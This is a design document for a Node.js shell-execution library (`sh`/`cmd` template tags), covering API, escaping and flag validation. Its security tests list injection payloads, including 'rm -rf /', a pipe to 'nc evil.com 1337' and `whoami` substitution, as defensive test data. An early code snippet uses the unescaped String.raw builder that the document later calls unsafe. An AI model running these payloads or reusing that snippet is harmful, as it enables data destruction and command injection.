# Shell Command Execution API (`sh` & `cmd`)

## Implementation Overview

The sh/cmd utilities provide ergonomic shell command execution with these key features:
- **Implementation**: `/index.js`
- **Tests**: `/util/process.test.js`
- **Features**: Streaming latency <50ms, color preservation, full API compliance
- **Security**: Flag name validation and shell escaping with support for any number of leading dashes

---

This document defines the design and usage patterns for the `sh` and `cmd`
template tag functions that provide ergonomic shell command execution in
Node.js projects.

## Overview

The `sh` and `cmd` functions are template tag functions that enable clean,
readable command execution using template literal syntax. They serve
different purposes:

- **`sh`**: Full shell execution with expansions, pipes, and shell features
- **`cmd`**: Direct process execution without shell interpretation

Both functions provide flexible input/output handling, consistent error
management, and safe interpolation with guaranteed shell escaping.

### Quick Examples

Basic command execution:
```javascript
// Shell features (pipes, expansions, redirects)
await sh`ls -la | grep ".js" | wc -l`
await sh`echo $HOME/*.txt`

// Direct execution (no shell)
await cmd`git status --porcelain`
await cmd`node --version`
```

Template interpolation (safely escaped):
```javascript
const filename = "file with spaces.txt"
const pattern = "search term"

// Values are automatically escaped for shell safety
await sh`grep ${pattern} ${filename}`
await cmd`cat ${filename}`

// NEVER causes injection vulnerabilities
const malicious = "file.txt; rm -rf /"
// Safely escaped
await sh`cat ${malicious}`
```

Object and array interpolation:
```javascript
// Objects become command-line flags
const options = { watch: true, port: 3000, config: "./app.json" };
await sh`build ${options}`;
// Result: build --watch --port=3000 --config="./app.json"

// Arrays become positional arguments  
const files = ["src/index.js", "src/utils.js"];
await cmd`eslint ${files} --fix`;
// Result: eslint src/index.js src/utils.js --fix

// See "Object and Array Interpolation" section for complete details
```

Live output streaming:
```javascript
// Interactive mode (inherit stdin + live stdout/stderr)
await sh.interactive`npm init`
await cmd.interactive`git commit`

// Live mode (live stdout/stderr only) 
await sh.live`npm install`
await cmd.live`docker build .`

// Equivalent configuration syntax
await sh({ output: true, debug: true })`npm test`
```

Safe mode for query commands:
```javascript
// Don't throw on non-zero exit
const result = await sh.safe`grep "TODO" src/**/*.js`
if (result.ok) {
  console.log("Found TODOs:", result.output)
} else {
  console.log("No TODOs found")
}
```

Piping input data:
```javascript
// String input
await sh.input("hello world")`wc -w`
await cmd.input("data to encode")`base64`

// Stream input
import { createReadStream } from "node:fs"
await sh.input(createReadStream("data.txt"))`gzip > data.gz`
```

Synchronous execution:
```javascript
// Block until complete
const pwd = sh.sync`pwd`
const files = cmd.sync`ls -1`
```

Chaining configurations:
```javascript
// Combine any configurations (order doesn't matter)
await sh.safe.live`npm test`
await cmd.sync.safe`which node`
await sh.safe.input("data")`grep pattern`
```

Error handling:
```javascript
try {
  await sh`exit 1`
} catch (error) {
  console.log(error.code)    // 1
  console.log(error.output)  // stdout content
  console.log(error.debug)   // stderr content
}

// Or use safe mode
const result = await sh.safe`exit 1`
if (!result.ok) {
  console.log(result.error.code)  // 1
}
```

---

## Goals

- **Ergonomic syntax**: Template literals with fluent API for configuration
- **Consistent interface**: Same return format and error handling for all
  modes
- **Flexible I/O**: Control input sources and output visibility
  independently
- **Security**: Guaranteed safe interpolation without shell injection
  vulnerabilities
- **Performance**: Both synchronous and asynchronous execution modes
- **Developer experience**: Clear error messages and intuitive API design

---

## Core Concepts

### Return Format

All commands return a `ProcessResult` class instance with consistent
properties:

```js
class ProcessResult {
  // true if exit code === 0
  ok: boolean;
  // ProcessError if code !== 0, undefined otherwise
  error: ProcessError | undefined;
  // captured standard output
  output: string;
  // captured standard error
  debug: string;
}
```

### Error Handling

- **Commands throw by default** when exit code !== 0
- **Throws `ProcessError`** with `.code`, `.output`, `.debug` properties
- **Use `throw: false` option** to disable throwing for query commands
- **Design philosophy**: Fail-fast by default, explicit handling for query
  commands

```js
class ProcessError extends Error {
  name: "ProcessError";
  // exit code
  code: number;
  // captured stdout
  output: string;
  // captured stderr
  debug: string;
}
```

The `throw: false` option:

```js
// Default behavior: throws on non-zero exit
const result = await sh`test -f missing.txt`; // throws

// With `throw: false`: returns result with error info
const result = await sh({ throw: false })`test -f missing.txt`;
if (!result.ok) {
  console.log(`Exit code: ${result.error.code}`);
}
```

### Safe Interpolation

- **Template literal values are safely escaped** for shell usage
- **Security guarantee**: No shell injection vulnerabilities
- **Automatic quoting**: Input values properly quoted/escaped


---

## API Design

### `sh` - Shell Execution

**Purpose**: Execute commands with full shell features including expansions,
pipes, and built-ins.

```js
const result = await sh`echo $HOME/*.js | wc -l`;
console.log(result.output);

const result = sh.sync`pwd`;
console.log(result.output);
```

### `cmd` - Direct Process Execution

**Purpose**: Execute processes directly without shell interpretation, safer
and faster.

```js
const result = await cmd`git status --porcelain`;
console.log(result.output);

const result = cmd.sync`node --version`;
console.log(result.output);
```

---

## API Reference

Basic async execution (throws on non-zero exit):

```js
await sh`ls -la | grep ".js"`;
await cmd`git status --porcelain`;
```

Configuration options:

```js
// Disable throwing on non-zero exit codes
await sh({ throw: false })`grep "pattern" file.txt`;

// Provide input to stdin
await sh({ input: "data" })`cat`;

// Show live output while capturing
await sh({ output: true })`npm install`;

// Show live debug/stderr while capturing
await sh({ debug: true })`npm test`;

// Combine multiple options
await sh({ throw: false, output: true, debug: true })`npm run build`;
```

Synchronous execution (throws on non-zero exit):

```js
sh.sync`pwd`;
cmd.sync`node --version`;
```

Interactive mode (shows live output/debug while capturing):

```js
await sh.interactive`npm install`;
await cmd.interactive`git commit`;
```

Pre-configured input:

```js
await sh.input("data")`cat`;
await cmd.input("hello")`base64`;
```

Safe mode (non-throwing for query commands):

```js
await sh.safe`grep "pattern" file.txt`;
await cmd.safe`test -f missing.txt`;
```

Sync with input:

```js
cmd.sync.input("test data")`wc -w`;
```

Chainable configurations:

```js
// Non-throwing + live output
await sh.safe.interactive`npm test`;

// Live output + non-throwing
await cmd.interactive.safe`git diff`;

// Non-throwing + input
await sh.safe.input("data")`grep pattern`;
```

Error handling for commands that fail:

```js
try {
  await sh`npm run build`;
} catch (error) {
  console.log(`Build failed with code ${error.code}`);
  console.log("Error output:", error.debug);
}
```

---

## API Aliases and Equivalent Configurations

The `sh` and `cmd` functions provide convenient aliases that are equivalent to
specific configuration objects:

### Input aliases:

These are equivalent:

```js
sh.input("data")`cat`
sh({ input: "data" })`cat`

cmd.input("hello")`base64`
cmd({ input: "hello" })`base64`

cmd.sync.input("test")`wc -w`
cmd.sync({ input: "test" })`wc -w`
```

**Purpose**: Pre-configure input data to be piped to the command's stdin.

**Use cases**:
```js
// Pipe data to stdin
const result = await sh.input("hello world")`wc -w`;
console.log(result.output); // "2"

// Base64 encode data
const encoded = await cmd.input("secret")`base64`;
console.log(encoded.output); // "c2VjcmV0"

// Synchronous input processing
const wordCount = cmd.sync.input("one two three")`wc -w`;
console.log(wordCount.output); // "3"
```

### Interactive aliases:

These are equivalent:

```js
sh.interactive`npm install`
sh({ output: true, debug: true })`npm install`

cmd.interactive`git commit`
cmd({ output: true, debug: true })`git commit`
```

**Purpose**: Enable interactive mode that shows live output and debug streams
while also capturing them for the return value.

### Safe Mode Aliases

These are equivalent:

```js
sh.safe`grep "pattern" file.txt`
sh({ throw: false })`grep "pattern" file.txt`

cmd.safe`test -f missing.txt`
cmd({ throw: false })`test -f missing.txt`
```

**Purpose**: Enable safe mode for query commands where non-zero exit codes are
expected and normal.

### Chainable Configurations

All aliases can be chained to combine behaviors in any order:

```js
// These are all equivalent:
sh.safe.interactive`npm test`
sh.interactive.safe`npm test`
sh({ throw: false, output: true, debug: true })`npm test`
```

**Implementation note**: Chaining uses getter functions with
`Object.defineProperty()`, allowing any combination order without
pre-defining every possibility. This means new configuration options
automatically work with existing chains.

---

## Factory Pattern Implementation

The architecture uses a pure factory pattern that creates template tag
functions with enclosed configuration state:

```js
function makeExecTag(config = {}) {
  // Dual-mode function: executes commands or returns configured variant
  function execTag(...args) {
    if (isConfigCall(args)) {
      // Configuration mode: return new configured function
      const [newConfig] = args;
      return makeExecTag({ ...config, ...newConfig });
    } else {
      // Template tag mode: execute command
      const [strings, ...values] = args;
      const commandString = buildCommand(strings, values);
      return execCommand(commandString, config);
    }
  }
  
  Object.defineProperties(execTag, {
    safe: makeProperty(function() {
      return makeExecTag({ ...config, throw: false });
    }),
    interactive: makeProperty(function() {
      return makeExecTag({ ...config, output: true, debug: true });
    }),
    sync: makeProperty(function() {
      return makeExecTag({ ...config, sync: true });
    }),
    input: makeMethod(function(inputData) {
      return makeExecTag({ ...config, input: inputData });
    }),
  });
  
  return execTag;
  
  function makeProperty(getter) {
    return { get: getter };
  }
  
  function makeMethod(fn) {
    return { value: fn };
  }
}

function isConfigCall(args) {
  const [first] = args;
  return typeof first === "object" && !Array.isArray(first);
}

function buildCommand(strings, values) {
  return String.raw({ raw: strings }, ...values);
}

// Create the main functions
export const sh = makeExecTag({ shell: true });
export const cmd = makeExecTag({ shell: false });
```

### Benefits of Factory Pattern

1. **Pure functions**: Each factory call returns a new function with its own
   enclosed config
2. **Consistent state management**: All config is stored in the closure
   scope, eliminating scattered state
3. **Natural composability**: Any combination works because each function is
   independent
4. **Cleaner implementation**: No manual property assignments, everything
   flows through the factory
5. **Automatic extensibility**: Adding new config options automatically works
   with all existing chains
6. **Better debugging**: Each function has clear config state in its closure

### State Encapsulation

The factory pattern provides proper state encapsulation:

- **No shared state**: Each function has its own config closure
- **Immutable chains**: Chaining creates new functions, never mutates
  existing ones
- **Clear data flow**: Configuration flows through the factory, not
  scattered across objects
- **Predictable behavior**: Each function's behavior is determined entirely
  by its enclosed config

This approach provides clean architecture while maintaining all
functionality and enabling extensibility.

---

## Interactive and Live Modes

### Interactive Mode (`.interactive`)

The `sh.interactive` and `cmd.interactive` variants are designed for
commands that require user interaction, inheriting stdin while streaming
output.

**Key Characteristics:**
- **Inherited stdin**: Parent's stdin is connected to the command
- **Live output**: stdout and stderr stream in real-time
- **Output capture**: Still captures output in `result.output` and 
  `result.debug`
- **Full I/O**: Complete interactive experience with input and output

### Live Mode (`.live`)

The `sh.live` and `cmd.live` variants are designed for commands where you
want to see live output without stdin interaction.

**Key Characteristics:**
- **No stdin**: Command cannot receive additional input during execution
- **Live output**: stdout and stderr stream in real-time  
- **Output capture**: Still captures output in `result.output` and
  `result.debug`
- **Monitoring**: Perfect for build processes, installations, and 
  long-running commands

### When to Use Each Mode

**Use `.interactive` when commands need user input:**

```js
// Commands that prompt for input
await sh.interactive`npm init`;
await sh.interactive`ssh user@server`;

// Interactive git operations  
await cmd.interactive`git commit`;  // Opens editor
await cmd.interactive`git rebase -i HEAD~3`;

// Interactive shells/REPLs
await cmd.interactive`python -i script.py`;
await sh.interactive`mysql -u root -p`;
```

**Use `.live` when you only need to monitor output:**

```js
// Package installation progress
await sh.live`npm install`;
await sh.live`yarn add react`;

// Build processes
await sh.live`npm run build`;
await cmd.live`docker build .`;

// Long-running tasks
await sh.live`npm test -- --watch`;
await cmd.live`webpack --watch`;
```

### Benefits of Both Modes

- **Output capture**: `result.output` and `result.debug` contain the full
  captured output (unlike stdio inheritance)
- **Live feedback**: See command progress in real-time while it executes
- **Error diagnostics**: Both see and capture error messages for debugging
- **Color preservation**: Terminal colors are maintained in live output

---

## Usage Examples

Basic usage:

```js
const fileCount = await sh`ls *.js | wc -l`;
const status = await cmd`git status --porcelain`;
const userFile = await cmd`cat ${filename}`;
```

Error handling:

```js
try {
  await sh`false`;
} catch (error) {
  console.log(error.code); // exit code
  console.log(error.output); // stdout
  console.log(error.debug); // stderr
}
```

Query commands that expect non-zero exit codes:

```js
const result = await sh({ throw: false })`grep "pattern" file.txt`;
if (result.ok) {
  console.log("Found matches:", result.output);
} else if (result.error.code === 1) {
  console.log("No matches found");
} else {
  // Re-throw unexpected errors
  throw result.error;
}
```

Migrating from Node.js `child_process`.

Before: callback-based exec:

```js
import { exec } from "node:child_process";
exec("git status", (err, stdout) => {
  if (err) throw err;
  console.log(stdout);
});
```

After: async/await with sh:

```js
import { sh } from "./index.js";
const result = await sh`git status`;
console.log(result.output);
```

Finding and processing files.

Shell features with pipes and expansions:

```js
const fileCount = await sh`find . -name "*.js" | wc -l`;
const homeFiles = await sh`echo $HOME/*.txt`;
```

Searching for patterns across files:

```js
const matches = await sh({ throw: false })`grep "TODO" src/**/*.js`;
if (matches.ok) {
  console.log("Found TODOs:", matches.output);
} else if (matches.error.code === 1) {
  console.log("No TODOs found!");
} else {
  // Re-throw unexpected errors
  throw matches.error;
}
```

---


## Security

**Shell escaping guarantee** - template literal values are automatically
escaped:

```js
const userInput = "file.txt; rm -rf /";
// Safe: becomes cat "file.txt; rm -rf /"
await sh`cat ${userInput}`;
```

**Direct execution safety** - `cmd` bypasses shell entirely:

```js
const malicious = "file.txt && rm important.txt";
// Safe: treated as single argument to cat
await cmd`cat ${malicious}`;
// Would try to cat a file literally named "file.txt && rm important.txt"
```

---

## Shell Escaping Architecture

### Design Principle: Escape at Source

Shell interpolation follows a simple rule: **Every interpolation site produces shell-safe output.**

This means escaping happens at the point where values are converted for shell use, not after composite strings are formed.

### Safe String System

Use a private symbol to track which strings have been properly escaped:

```js
const SHELL_SAFE = Symbol('shellSafe');

function markSafeString(str) {
  if (typeof str !== "string") {
    throw new Error("Only strings can be marked as shell-safe");
  }
  const safeStr = new String(str);
  safeStr[SHELL_SAFE] = true;
  return safeStr;
}

function isSafeString(str) {
  return typeof str === "string" && str[SHELL_SAFE] === true;
}
```

### Unified Shell Escaping

The escaping function uses single quotes for simplicity and safety:

```js
function shellEscape(value) {
  if (typeof value === "string" && isSafeString(value)) {
    return value; // Already safe
  }
  
  const str = String(value);
  if (str === "") {
    return "''";
  }
  return `'${str.replaceAll("'", "'\\''")}'`;
}
```

**Design decisions:**
- **Always use single quotes**: Simpler than mixed quoting strategies
- **No "safe character" optimization**: Consistent escaping eliminates edge cases  
- **Handle already-safe strings**: Prevents double-escaping
- **Convert all inputs to string**: Works with any JavaScript value

### Object and Array Interpolation

Objects and arrays can be interpolated directly in template literals to generate 
command-line arguments. This enables clean, programmatic command construction.

#### Object Arguments as Named Flags

Objects are automatically converted to command-line flags using their keys as 
flag names:

```javascript
// Basic object argument usage
const buildOptions = {
  watch: true,
  quiet: false,
  configFile: "/path/to/config.json",
  port: 8080,
  verbose: undefined,
  noInput: null
};

await sh`build ${buildOptions}`;
// Result: build --watch --configFile="/path/to/config.json" --port=8080
```

**Flag Generation Rules:**
- **Truthy values** (except `undefined`/`null`) include the flag
- **Falsy and nullish values** exclude the flag entirely  
- **Boolean `true`** creates a bare flag: `--flag`
- **Other values** create key-value flags: `--flag=value`
- **String and number values** are properly quoted for shell safety

**String Literal Keys for Precise Control:**

```javascript
// Use string keys for exact flag control
const preciseArgs = {
  "--watch": true,
  "--quiet": false,        // Excluded (falsy)
  "--config-file": "/path/to/config.json",
  "--port": 8080,
  "-v": true,             // Short flag
  "---legacy": "value"    // Custom dash count
};

await sh`command ${preciseArgs}`;
// Result: command --watch --config-file="/path/to/config.json" --port=8080 -v ---legacy=value
```

#### Array Arguments as Positional Arguments

Arrays are expanded to individual positional arguments:

```javascript
// File list as array
const sourceFiles = ["src/index.js", "src/utils.js", "src/main.js"];
const eslintFlags = ["--fix", "--quiet"];

await sh`eslint ${sourceFiles} ${eslintFlags}`;
// Result: eslint src/index.js src/utils.js src/main.js --fix --quiet
```

**Array Handling Rules:**
- Each array element becomes a separate argument
- `null` and `undefined` elements are filtered out
- Other values are converted to strings
- Empty arrays contribute nothing to the command

**Complex Example:**

```javascript
// Real-world scenario: dynamic build command
const input = { watch: true, minify: false, verbose: true };

const buildConfig = {
  watch: input.watch,
  minify: input.minify,     // Excluded (false)  
  output: "./dist",
  verbose: input.verbose,
  mode: "development"
};

const sourceFiles = [
  "src/index.js", 
  "src/components/**/*.js",
  null,                     // Filtered out
  "src/utils.js"
];

await sh`webpack ${sourceFiles} ${buildConfig}`;
// Result: webpack src/index.js "src/components/**/*.js" src/utils.js --watch --output="./dist" --verbose --mode="development"
```

#### Implementation Details

Objects and arrays require special handling with escape-at-source architecture:

#### Object to CLI Flags with Validation

Objects are converted to CLI flags using a secure validation strategy that preserves original flag names:

```js
function objectToCLIFlags(obj) {
  return markSafeString(
    Object.entries(obj)
      .filter(([key, value]) => shouldIncludeFlag({ value }))
      .map(([key, value]) => {
        const safeKey = formatFlagName(key); // Validates key
        const safeValue = value === true ? '' : `=${shellEscape(String(value))}`;
        return `${safeKey}${safeValue}`;
      })
      .join(" ")
  );
}

function formatFlagName(key) {
  // Handle flags with any number of leading dashes
  let flagName = key;
  let prefix = "";
  
  if (key.startsWith("-")) {
    // Find where the flag name starts (after all leading dashes)
    const dashMatch = key.match(/^-+/);
    if (dashMatch) {
      prefix = dashMatch[0];  // Preserve exact number of dashes
      flagName = key.slice(prefix.length);
    }
  } else {
    prefix = "--";
    flagName = key;
  }
  
  // Validate the flag name portion (must not be empty and must be valid identifier)
  if (flagName === "") {
    throw new Error(`Invalid flag name: "${key}". Flag names cannot be only dashes.`);
  }
  
  const isValidFlagName = /^[a-zA-Z_][a-zA-Z0-9_-]*$/.test(flagName);
  if (!isValidFlagName) {
    throw new Error(`Invalid flag name: "${key}". Flag names must start with a letter or underscore, and contain only letters, numbers, underscores, and hyphens.`);
  }
  
  // Return with the original or default prefix
  return `${prefix}${flagName}`;
}
```

**Security Benefits:**
- **Reject dangerous keys** instead of trying to escape them
- **Fail-fast validation** prevents command injection at the source
- **Clear error messages** help developers understand valid flag patterns
- **No automatic transformations** - preserves exact flag names for CLI compatibility

**Valid Flag Patterns:**
```javascript
// ✅ Valid - preserved as-is:
{ someKey: "value" }            → --someKey=value
{ XMLParser: "config" }         → --XMLParser=config
{ HTTP_REQUEST: "url" }         → --HTTP_REQUEST=url
{ UPPERCASE: "value" }          → --UPPERCASE=value
{ snake_case: "value" }         → --snake_case=value
{ _private: "value" }           → --_private=value
{ "version-name": "v1.0" }      → --version-name=v1.0

// ✅ Pre-dashed flags - any number of dashes supported:
{ "-v": "value" }               → -v=value (short flag)
{ "--help": "value" }           → --help=value (long flag)
{ "---legacy": "value" }        → ---legacy=value (triple dash)
{ "----enterprise": "value" }   → ----enterprise=value (quad dash)
{ "-----custom-tool": "value" } → -----custom-tool=value (five dashes)

// ❌ Invalid - throws error:
{ "$(echo PWNED)": "value" }    // Shell metacharacters
{ "---$(evil)": "value" }       // Shell metacharacters with dashes
{ "../../etc/passwd": "value" } // Path traversal  
{ "foo bar": "value" }          // Spaces
{ "----foo bar": "value" }      // Spaces with dashes
{ "with.dots": "value" }        // Dots not allowed
{ "123numbers": "value" }       // Starts with number
{ "---123invalid": "value" }    // Starts with number with dashes
{ "": "value" }                 // Empty string
{ "---": "value" }              // Only dashes
{ "!@#$%": "value" }           // Special characters
```

**Design Rationale:**
- **Maximum CLI Compatibility**: Supports any number of leading dashes to accommodate legacy/enterprise tools with unusual conventions
- **Predictable Output**: Users get exactly what they specify in their object keys, including exact dash count
- **User Control**: Developers can choose their own naming conventions (`someKey`, `some_key`, `SOME_KEY`) and dash patterns (`-v`, `--verbose`, `---legacy`)
- **Security**: Validation prevents dangerous inputs while preserving all valid flag patterns
- **Future-Proof**: Won't break existing tools regardless of their dash conventions

#### Array to Arguments Implementation

Arrays are processed with escape-at-source for maximum safety:

```js
function arrayToArgs(arr) {
  const escaped = arr
    .filter(item => item !== null && item !== undefined)
    .map(item => shellEscape(String(item)));
  return markSafeString(escaped.join(" "));
}
```

**Processing Rules:**
- Each element is individually escaped for shell safety
- `null` and `undefined` elements are automatically filtered out
- All other values are converted to strings before escaping
- Result is marked as a safe string to prevent double-escaping

### Security Benefits

**Security by Design**
- Every interpolation point explicitly handles shell safety
- **Validation-first approach**: Reject dangerous inputs instead of trying to escape them
- Intentional escaping at the source of each value
- **Fail-fast validation**: Errors thrown immediately on invalid flag names

**Simplicity**
- Single, consistent escaping strategy for values
- **Clear validation rules**: Only valid JavaScript identifiers allowed as flag names
- No complex quote detection logic
- Predictable behavior across all input types

**Composability**  
- Safe strings can be combined without losing safety
- No double-escaping issues
- Clear ownership of escaping responsibility
- **No automatic transformations**: Preserves exact flag names for maximum compatibility

**Auditability**
- Easy to verify what has been escaped
- Security properties visible at each interpolation site
- **Explicit error messages**: Clear feedback on why flag names are rejected
- Simple mental model for developers

### Implementation Requirements

1. **Safe string infrastructure**: Symbol-based marking system
2. **Unified escaping function**: Single-quote strategy for all values  
3. **Flag name validation**: Strict validation of object keys without transformation
4. **Preserve original flag names**: No automatic camelCase conversion for CLI compatibility
5. **Escape-at-source**: Object keys, values, and array elements escaped individually
6. **Composition safety**: Safe strings preserve safety when combined
7. **Type safety**: Only strings can be marked as shell-safe

This architecture makes shell escaping **explicit, predictable, and secure by design**.

### Security Design Philosophy

The flag name validation system follows a **validation-first approach** that prioritizes security and CLI compatibility:

1. **Strict Validation**: Only valid JavaScript identifiers are allowed as flag names
2. **No Automatic Transformation**: Original flag names are preserved exactly as specified  
3. **Security by Rejection**: Dangerous inputs are rejected with clear error messages rather than attempting to escape them
4. **CLI Compatibility**: Any valid identifier naming convention is supported without forced transformation
5. **Comprehensive Testing**: Security tests verify safe behavior with preserved flag names

**Security Benefits**: Eliminates command injection vulnerabilities by rejecting dangerous inputs at the source rather than trying to escape them.

**Compatibility Benefits**: Preserves CLI compatibility by not forcing naming conventions - users can use `someKey`, `some_key`, `SOME_KEY`, or any valid identifier pattern.

**Template Literal Security Requirements:**

The shell execution system must properly escape template literal values to prevent injection vulnerabilities. A naive implementation using only `String.raw()` would be vulnerable:

```javascript
// UNSAFE - do not implement this way:
function buildCommand(strings, values) {
  return String.raw({ raw: strings }, ...values);
}
```

Such an implementation would be vulnerable to shell injection:

```javascript
// UNSAFE EXAMPLE:
const userInput = "file.txt; rm -rf /";
await sh`cat ${userInput}`;  // Would execute: cat file.txt; rm -rf /
```

**Secure Implementation:**

Template literal values must be properly escaped for shell safety:

```javascript
function escapeShellArg(arg) {
  // For shell mode: wrap in single quotes and escape internal single quotes
  return "'" + String(arg).replace(/'/g, "'\"'\"'") + "'";
}

function buildCommand(strings, values) {
  let result = strings[0];
  for (let i = 0; i < values.length; i++) {
    result += escapeShellArg(values[i]) + strings[i + 1];
  }
  return result;
}
```

**Security Testing Strategy:**

Comprehensive tests verify shell injection protection:

```javascript
// Test cases for shell escaping
const maliciousInputs = [
  "file.txt; rm -rf /",           // Command injection
  "file.txt && rm important.txt", // Command chaining
  "file.txt || echo pwned",       // Command alternation
  "file.txt | nc evil.com 1337",  // Pipe to network
  "file.txt `whoami`",            // Command substitution
  "file.txt $(whoami)",           // Command substitution (modern)
  "file.txt > /etc/passwd",       // Output redirection
  "file.txt' || echo pwned || '", // Quote escaping attempt
  "'file.txt'; echo pwned; #",    // Quote breaking
];

// Each input should be safely escaped when used with sh`...`
for (const malicious of maliciousInputs) {
  test(`sh escapes malicious input: ${malicious}`, async () => {
    const result = await sh.safe`echo "Processing: ${malicious}"`;
    // Should only echo the literal string, no command execution
    assert(result.output.includes(malicious));
    assert(!result.output.includes("pwned"));
    assert(!result.output.includes("root")); // No whoami execution
  });
}

// Test that cmd mode is immune to shell injection
for (const malicious of maliciousInputs) {
  test(`cmd immune to shell injection: ${malicious}`, async () => {
    // cmd should treat malicious input as literal arguments
    const result = await cmd.safe`echo ${malicious}`;
    // cmd passes malicious string as literal argument to echo
    assert(result.output.includes(malicious));
  });
}
```

**Best practices:**
- Use `cmd` for user input (safer - bypasses shell entirely)
- Use `sh` for trusted shell operations with proper escaping
- Validate input when applicable
- Use absolute paths to avoid PATH attacks
- Test escaping with malicious input during development
- Run security tests in CI/CD pipeline
- Never trust user input without validation

**ENOENT Error Handling:**

When a command doesn't exist, Node.js throws an `ENOENT` error. Shell 
conventions expect exit code 127 for "command not found". The implementation 
must map this correctly:

```javascript
child.on("error", (error) => {
  const processError = new ProcessError(
    error.message,
    error.code === 'ENOENT' ? 127 : 1,  // Shell-standard exit code
    "",
    error.message
  );
});
```

---

## Implementation Details

### Core Architecture

Both functions follow the same pattern:
1. **Configuration parsing**: Handle fluent API and object configuration
2. **Input validation**: Ensure valid option combinations
3. **Safe interpolation**: Automatic escaping for shell security
4. **Process execution**: Delegate to appropriate `child_process` APIs
5. **Output handling**: Capture and/or display output based on configuration
6. **Error handling**: Consistent error objects and throwing behavior

### Error Objects

Error objects always include:
- `.code` - Exit code number
- `.output` - Captured stdout
- `.debug` - Captured stderr
- `.message` - Descriptive error message

### Security Model

Template literal interpolation is automatically escaped to prevent injection
vulnerabilities. The `cmd` function provides additional safety by bypassing
shell interpretation entirely.


---

## Architectural Patterns

### 1. Factory Function Pattern

The core architecture uses a factory function that creates template tag
functions with embedded configuration:

```javascript
function makeExecTag(config = {}) {
  function execTag(...args) {
    return isConfigCall(args) ? handleConfigCall(args) : handleExecTag(args);
  }
  
  function isConfigCall(args) {
    const [firstArg] = args;
    return typeof firstArg === "object" && !Array.isArray(firstArg);
  }
  
  function handleConfigCall(args) {
    const [newConfig] = args;
    return makeExecTag({ ...config, ...newConfig });
  }
  
  function handleExecTag(args) {
    const [strings, ...values] = args;
    const commandString = buildCommand(strings, values);
    return runCommand(commandString, config);
  }
  
  // Define configuration aliases as properties
  Object.defineProperties(execTag, {
    safe: makeProperty(() => {
      return makeExecTag({
        ...config,
        throw: false,
      });
    }),
    interactive: makeProperty(() => {
      return makeExecTag({
        ...config,
        input: true,
        output: true,
        debug: true,
      });
    }),
    live: makeProperty(() => {
      return makeExecTag({
        ...config,
        output: true,
        debug: true,
      });
    }),
    sync: makeProperty(() => {
      return makeExecTag({
        ...config,
        sync: true,
      });
    }),
    input: makeMethod((inputData) => {
      return makeExecTag({
        ...config,
        input: inputData,
      });
    }),
  });
  
  return execTag;
}
```

### 2. Dual Call Mode Support

Each template tag function supports two distinct call patterns:

**Template Tag Mode** (executes command):
```javascript
await sh`git status`
```

**Configuration Mode** (returns new function):
```javascript
const safeSh = sh({ throw: false });
await safeSh`git status`
```

### 3. Configuration Chaining

Configuration calls return new template tag functions that can be chained
in any order:

```javascript
// All equivalent - order doesn't matter
await sh.safe.interactive`npm test`
await sh.interactive.safe`npm test`
await sh({ throw: false, output: true, debug: true })`npm test`
```

### 4. Immutable Configuration State

Each template tag function stores its own configuration in closure scope.
Configuration changes create **new functions** rather than mutating
existing ones:

```javascript
// base is unchanged - still throws on error
const base = sh;
// safe never throws
const safe = base.safe;        // New function with throw: false
// interactive never throws AND shows live output
const interactive = safe.interactive;  // New function with combined config
```

### 5. Implementation Structure

The factory uses getter properties and methods to enable chaining:

```javascript
function makeProperty(getter) {
  return { get: getter };
}

function makeMethod(fn) {
  return { value: fn };
}

Object.defineProperties(execTag, {
  safe: makeProperty(() => 
    makeExecTag({ ...config, throw: false })),
  input: makeMethod((data) => 
    makeExecTag({ ...config, input: data })),
});
```

### 6. Configuration Aliases

All aliases are pure configuration shortcuts with no special behavior:

- **`.safe`** → `{ throw: false }`
- **`.interactive`** → `{ input: true, output: true, debug: true }`
- **`.sync`** → `{ sync: true }`
- **`.input(data)`** → `{ input: data }`

These compose naturally:
```javascript
sh.sync.safe`which node`  // { sync: true, throw: false }
```

### 7. Streaming and Color Output

**CRITICAL REQUIREMENT**: When `output: true` or `debug: true` is set,
the implementation MUST:

- **Preserve colors**: Set appropriate environment variables to force
  color output
- **Stream in real-time**: Display output as it arrives, not buffered
- **Capture simultaneously**: Both stream live AND capture for return value

Environment variables for color control:
```javascript
function buildColorEnv(colorEnabled) {
  const { CI, NO_COLOR, FORCE_COLOR, ...baseEnv } = process.env;
  
  if (colorEnabled) {
    // Force color output
    return {
      ...baseEnv,
      FORCE_COLOR: "1",
      TERM: "xterm-256color", 
      NODE_FORCE_COLOR: "1",
      COLORTERM: "truecolor",
    };
  } else {
    // Disable color output  
    return {
      ...baseEnv,
      NO_COLOR: "1",
      FORCE_COLOR: "0",
    };
  }
}
```

Buffer management for simultaneous streaming and capture:
```javascript
// Collect Buffer chunks as they arrive (streams emit multiple chunks)
const stdoutChunks = [];
child.stdout.on("data", function (chunk) {
  if (config.output === true) {
    // Stream immediately
    process.stdout.write(chunk);
  }
  
  // Capture for returned result
  stdoutChunks.push(chunk);
});

// After process completes, assemble chunks into final string
const fullOutput = Buffer.concat(stdoutChunks).toString("utf-8");
```

### 8. Configuration Object Definition

The config object controls all aspects of command execution:

```typescript
interface ExecConfig {
  // Core execution options
  shell?: boolean;      // true for sh, false for cmd
  sync?: boolean;       // Synchronous vs asynchronous execution
  throw?: boolean;      // Throw on non-zero exit (default: true)
  
  // I/O options
  // Data to pipe to stdin or inherit
  input?: string | ReadableStream | boolean;
  output?: boolean;     // Stream stdout live (default: false)
  debug?: boolean;      // Stream stderr live (default: false)
  
  // Environment options
  color?: boolean;      // Control color output (default: true)
  env?: object;         // Environment variables
}
```

### 9. Complete Config Options Reference

#### Core Execution Options

**`shell`** — Enable shell interpretation  
- **Type**: `boolean`
- **Default**: `true` for `sh`, `false` for `cmd`
- **Values**:
  - `true`: Commands run through shell (`/bin/sh` or `cmd.exe`)
  - `false`: Direct process execution without shell interpretation
- **Maps to**: `spawn(command, [], { shell: config.shell })`

**`sync`** — Synchronous execution mode  
- **Type**: `boolean`
- **Default**: `false`
- **Values**:
  - `true`: Blocks until command completes, returns result immediately
  - `false`: Returns Promise that resolves when command completes
- **Maps to**: Choice between `spawnSync()` and `spawn()`

**`throw`** — Error throwing behavior
- **Type**: `boolean`
- **Default**: `true`
- **Values**:
  - `true`: Non-zero exit codes throw `ProcessError`
  - `false`: Non-zero exit codes return `ProcessResult` with error info
- **Maps to**: Error handling logic (not a spawn option)

#### I/O Stream Options

**`input`** — Standard input configuration  
- **Type**: `string | ReadableStream | boolean`
- **Default**: `false`
- **Always uses**: `stdio[0]: "pipe"`
- **Behavior by value**:
  - `string`: Write text to stdin → `child.stdin.write(input)`
